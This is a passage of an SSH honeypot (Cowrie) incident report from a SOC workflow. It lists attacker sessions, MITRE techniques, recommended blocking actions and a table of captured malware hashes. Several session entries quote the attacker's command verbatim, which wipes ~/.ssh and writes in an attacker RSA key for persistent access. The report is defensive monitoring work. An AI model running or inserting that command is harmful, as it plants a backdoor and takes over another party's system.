| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:24:10` | `cowrie.session.connect` |
| `2026-04-19 14:24:10` | `cowrie.client.version` |
| `2026-04-19 14:24:11` | `cowrie.client.kex` |
| `2026-04-19 14:24:11` | `cowrie.login.success` |
| `2026-04-19 14:24:11` | `cowrie.session.params` |
| `2026-04-19 14:24:11` | `cowrie.command.input` |
| `2026-04-19 14:24:11` | `cowrie.command.failed` |
| `2026-04-19 14:24:12` | `cowrie.log.closed` |
| `2026-04-19 14:24:12` | `cowrie.session.params` |
| `2026-04-19 14:24:12` | `cowrie.command.input` |
| `2026-04-19 14:24:12` | `cowrie.session.file_download` |
| `2026-04-19 14:24:12` | `cowrie.log.closed` |
| `2026-04-19 14:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bedaf9d144b

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:24 |
| **Last Seen** | 2026-04-19 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:24:14` | `cowrie.session.connect` |
| `2026-04-19 14:24:14` | `cowrie.client.version` |
| `2026-04-19 14:24:14` | `cowrie.client.kex` |
| `2026-04-19 14:24:15` | `cowrie.login.success` |
| `2026-04-19 14:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb9381f283e

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:24 |
| **Last Seen** | 2026-04-19 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:24:46` | `cowrie.session.connect` |
| `2026-04-19 14:24:46` | `cowrie.client.version` |
| `2026-04-19 14:24:46` | `cowrie.client.kex` |
| `2026-04-19 14:24:47` | `cowrie.login.success` |
| `2026-04-19 14:24:47` | `cowrie.session.params` |
| `2026-04-19 14:24:47` | `cowrie.command.input` |
| `2026-04-19 14:24:47` | `cowrie.command.failed` |
| `2026-04-19 14:24:47` | `cowrie.log.closed` |
| `2026-04-19 14:24:47` | `cowrie.session.params` |
| `2026-04-19 14:24:47` | `cowrie.command.input` |
| `2026-04-19 14:24:48` | `cowrie.session.file_download` |
| `2026-04-19 14:24:48` | `cowrie.log.closed` |
| `2026-04-19 14:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb918c2f4991

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:24 |
| **Last Seen** | 2026-04-19 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:24:50` | `cowrie.session.connect` |
| `2026-04-19 14:24:50` | `cowrie.client.version` |
| `2026-04-19 14:24:50` | `cowrie.client.kex` |
| `2026-04-19 14:24:51` | `cowrie.login.success` |
| `2026-04-19 14:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4196f160ebe7

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:24 |
| **Last Seen** | 2026-04-19 14:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:24:57` | `cowrie.session.connect` |
| `2026-04-19 14:24:57` | `cowrie.client.version` |
| `2026-04-19 14:24:57` | `cowrie.client.kex` |
| `2026-04-19 14:24:57` | `cowrie.login.success` |
| `2026-04-19 14:24:57` | `cowrie.session.params` |
| `2026-04-19 14:24:57` | `cowrie.command.input` |
| `2026-04-19 14:24:57` | `cowrie.command.failed` |
| `2026-04-19 14:24:57` | `cowrie.log.closed` |
| `2026-04-19 14:24:57` | `cowrie.session.params` |
| `2026-04-19 14:24:57` | `cowrie.command.input` |
| `2026-04-19 14:24:57` | `cowrie.session.file_download` |
| `2026-04-19 14:24:57` | `cowrie.log.closed` |
| `2026-04-19 14:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535c4f5ca37e

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:24 |
| **Last Seen** | 2026-04-19 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:24:59` | `cowrie.session.connect` |
| `2026-04-19 14:24:59` | `cowrie.client.version` |
| `2026-04-19 14:24:59` | `cowrie.client.kex` |
| `2026-04-19 14:25:00` | `cowrie.login.success` |
| `2026-04-19 14:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63e7e56ab94

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:26 |
| **Last Seen** | 2026-04-19 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:26:17` | `cowrie.session.connect` |
| `2026-04-19 14:26:17` | `cowrie.client.version` |
| `2026-04-19 14:26:17` | `cowrie.client.kex` |
| `2026-04-19 14:26:18` | `cowrie.login.success` |
| `2026-04-19 14:26:18` | `cowrie.session.params` |
| `2026-04-19 14:26:18` | `cowrie.command.input` |
| `2026-04-19 14:26:18` | `cowrie.command.failed` |
| `2026-04-19 14:26:18` | `cowrie.log.closed` |
| `2026-04-19 14:26:19` | `cowrie.session.params` |
| `2026-04-19 14:26:19` | `cowrie.command.input` |
| `2026-04-19 14:26:19` | `cowrie.session.file_download` |
| `2026-04-19 14:26:19` | `cowrie.log.closed` |
| `2026-04-19 14:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdfb4a310dc2

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:26 |
| **Last Seen** | 2026-04-19 14:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:26:21` | `cowrie.session.connect` |
| `2026-04-19 14:26:21` | `cowrie.client.version` |
| `2026-04-19 14:26:21` | `cowrie.client.kex` |
| `2026-04-19 14:26:22` | `cowrie.login.success` |
| `2026-04-19 14:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c239908cfe

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:27 |
| **Last Seen** | 2026-04-19 14:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:27:08` | `cowrie.session.connect` |
| `2026-04-19 14:27:08` | `cowrie.client.version` |
| `2026-04-19 14:27:08` | `cowrie.client.kex` |
| `2026-04-19 14:27:09` | `cowrie.login.success` |
| `2026-04-19 14:27:09` | `cowrie.session.params` |
| `2026-04-19 14:27:09` | `cowrie.command.input` |
| `2026-04-19 14:27:09` | `cowrie.command.failed` |
| `2026-04-19 14:27:09` | `cowrie.log.closed` |
| `2026-04-19 14:27:10` | `cowrie.session.params` |
| `2026-04-19 14:27:10` | `cowrie.command.input` |
| `2026-04-19 14:27:10` | `cowrie.session.file_download` |
| `2026-04-19 14:27:10` | `cowrie.log.closed` |
| `2026-04-19 14:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47005abd224

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:27 |
| **Last Seen** | 2026-04-19 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:27:12` | `cowrie.session.connect` |
| `2026-04-19 14:27:12` | `cowrie.client.version` |
| `2026-04-19 14:27:12` | `cowrie.client.kex` |
| `2026-04-19 14:27:13` | `cowrie.login.success` |
| `2026-04-19 14:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c1d6a92a2af

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:27 |
| **Last Seen** | 2026-04-19 14:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:27:29` | `cowrie.session.connect` |
| `2026-04-19 14:27:29` | `cowrie.client.version` |
| `2026-04-19 14:27:29` | `cowrie.client.kex` |
| `2026-04-19 14:27:30` | `cowrie.login.success` |
| `2026-04-19 14:27:31` | `cowrie.session.params` |
| `2026-04-19 14:27:31` | `cowrie.command.input` |
| `2026-04-19 14:27:31` | `cowrie.command.failed` |
| `2026-04-19 14:27:31` | `cowrie.log.closed` |
| `2026-04-19 14:27:32` | `cowrie.session.params` |
| `2026-04-19 14:27:32` | `cowrie.command.input` |
| `2026-04-19 14:27:32` | `cowrie.session.file_download` |
| `2026-04-19 14:27:32` | `cowrie.log.closed` |
| `2026-04-19 14:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fecd8e6fa61a

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:27 |
| **Last Seen** | 2026-04-19 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:27:36` | `cowrie.session.connect` |
| `2026-04-19 14:27:36` | `cowrie.client.version` |
| `2026-04-19 14:27:36` | `cowrie.client.kex` |
| `2026-04-19 14:27:37` | `cowrie.login.success` |
| `2026-04-19 14:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3642345386c

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:29 |
| **Last Seen** | 2026-04-19 14:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:29:07` | `cowrie.session.connect` |
| `2026-04-19 14:29:07` | `cowrie.client.version` |
| `2026-04-19 14:29:07` | `cowrie.client.kex` |
| `2026-04-19 14:29:08` | `cowrie.login.success` |
| `2026-04-19 14:29:08` | `cowrie.session.params` |
| `2026-04-19 14:29:08` | `cowrie.command.input` |
| `2026-04-19 14:29:08` | `cowrie.command.failed` |
| `2026-04-19 14:29:08` | `cowrie.log.closed` |
| `2026-04-19 14:29:09` | `cowrie.session.params` |
| `2026-04-19 14:29:09` | `cowrie.command.input` |
| `2026-04-19 14:29:09` | `cowrie.session.file_download` |
| `2026-04-19 14:29:09` | `cowrie.log.closed` |
| `2026-04-19 14:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b00eb91a43c

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:29 |
| **Last Seen** | 2026-04-19 14:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:29:11` | `cowrie.session.connect` |
| `2026-04-19 14:29:11` | `cowrie.client.version` |
| `2026-04-19 14:29:11` | `cowrie.client.kex` |
| `2026-04-19 14:29:12` | `cowrie.login.success` |
| `2026-04-19 14:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.189.235[.]33` | **25** | 2026-04-19 13:51 | 2026-04-19 14:36 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.193.190[.]100` | **25** | 2026-04-19 13:54 | 2026-04-19 14:38 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.141.71[.]166` | **25** | 2026-04-19 13:52 | 2026-04-19 14:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.101.74[.]113` | **25** | 2026-04-19 13:54 | 2026-04-19 14:29 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `91.99.110[.]230` | **25** | 2026-04-19 13:51 | 2026-04-19 14:28 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `48.216.244[.]43` | **2** | 2026-04-19 14:00 | 2026-04-19 14:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.74.242[.]167` | 1 | 2026-04-19 13:52 | 2026-04-19 13:54 | 94s | 0 | `T1592` | 🟢 LOW |
| `117.128.86[.]100` | 1 | 2026-04-19 13:52 | 2026-04-19 13:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-04-19 13:53 | 2026-04-19 13:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.64.168[.]136` | 1 | 2026-04-19 13:54 | 2026-04-19 13:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.190.156[.]109` | 1 | 2026-04-19 13:51 | 2026-04-19 13:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `98.71.8[.]129` | 1 | 2026-04-19 13:10 | 2026-04-19 13:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
